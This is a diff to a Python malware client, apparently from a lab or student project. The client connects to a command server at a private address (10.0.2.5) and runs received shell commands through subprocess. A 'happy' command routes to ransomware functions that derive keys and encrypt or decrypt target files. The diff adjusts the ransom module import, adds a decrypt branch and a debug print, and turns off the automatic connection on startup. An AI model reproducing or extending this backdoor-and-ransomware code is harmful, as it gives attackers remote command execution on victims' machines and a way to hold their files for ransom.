@@ -3,7 +3,10 @@ import os
 import subprocess
 import sys
 import time
-import ransom
+
+import mlw.ransom as ransom
+
+ransom.dummy = "D"
 
 # SERVER_HOST = "127.0.0.1"
 SERVER_HOST = "10.0.2.5"
@@ -33,9 +36,11 @@ def ransomProc(cmd):
     if cmd[0].lower() == "e":
         key, salt = ransom.generate_key(cmd[2])
         output = ransom.enc_det(cmd[1], key)
-    else:
+    elif cmd[0].lower() == "d":
         key, salt = ransom.generate_key(cmd[2], load_existing_salt=True)
         output = ransom.dec_det(cmd[1], key)
+    else:
+        pass
     return output
 
 def cmds(s):
@@ -60,6 +65,7 @@ def cmds(s):
             else:
                 output = ""
         elif splited_command[0].lower() == "happy":
+            print(splited_command[1:])
             output = ransomProc(splited_command[1:])
         else:
             output = subprocess.getoutput(command)
@@ -74,4 +80,4 @@ def cmds(s):
     else: os._exit(1)
 
 if __name__ == '__main__':
-    autoconn()
+    pass
